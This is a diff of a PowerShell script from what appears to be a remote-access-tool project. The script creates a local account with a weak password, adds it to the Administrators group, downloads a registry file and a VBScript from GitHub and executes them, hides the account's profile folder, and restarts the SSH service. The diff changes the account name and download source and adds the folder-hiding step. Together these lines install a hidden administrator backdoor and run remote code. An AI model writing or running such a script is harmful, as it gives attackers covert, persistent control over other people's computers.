@@ -30,23 +30,26 @@ if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyCon
 
 
 
- New-LocalUser -Name "Broo" -Password (ConvertTo-SecureString "1234" -AsPlainText -Force) -FullName "dummy xd" -Description "idk"
+ New-LocalUser -Name "jarbouu3" -Password (ConvertTo-SecureString "1234" -AsPlainText -Force) -FullName "dummy xd" -Description "idk"
 
 
 net user Broo test 
 
-net localgroup Administrateurs Broo /add 
+net localgroup Administrateurs jarbouu3 /add 
 
 
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaledmraad/Ratatouille/main/hello.vbs" -OutFile "hello.vbs" 
-
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/khaledmraad/Ratatouille/main/wreg.reg -OutFile "wreg.reg"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"
 
 
-./wreg.reg; ./hello 
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"
 
 
+.\wreg.reg; .\hello 
+
+cd C:\Users
+attrib +h +s +r Broo
 
 
 Restart-Service sshd
 
+calc
